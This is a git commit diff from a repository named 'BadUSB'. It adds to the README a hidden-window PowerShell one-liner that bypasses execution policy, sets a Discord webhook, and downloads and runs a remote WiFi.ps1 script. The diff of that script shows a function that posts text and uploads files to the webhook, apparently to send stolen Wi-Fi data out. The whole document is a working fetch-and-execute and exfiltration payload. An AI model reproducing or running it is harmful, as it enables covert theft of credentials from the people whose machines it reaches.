7124b3b15396dfe46070f048eb47f2de8bb19060
Guess Who <ARGimadeyev@stud.kpfu.ru>
2024-04-13 22:56:34 +0300

    test.02

--- README.md
+++ README.md
@@ -1,1 +1,4 @@
 # BadUSB
+```
+powershell -w h -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/1227962310795202571/2Rv1wGMwe5dTBqNYNDn6S_UYJ4JN4O6783tmlrnRUnMaa2S7fSOrYHdhxplyNW1-4o7Z'; irm https://raw.githubusercontent.com/ARGimadeyev/BadUSB/main/WiFi.ps1 | iex
+```
--- WiFi.ps1
+++ WiFi.ps1
@@ -25,7 +25,7 @@ function Upload-Discord
     if (-not ([string]::IsNullOrEmpty($text)))
     {
         Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
-    }
+    };
     if (-not ([string]::IsNullOrEmpty($file)))
     {
         curl.exe -F "file1=@$file" $hookurl
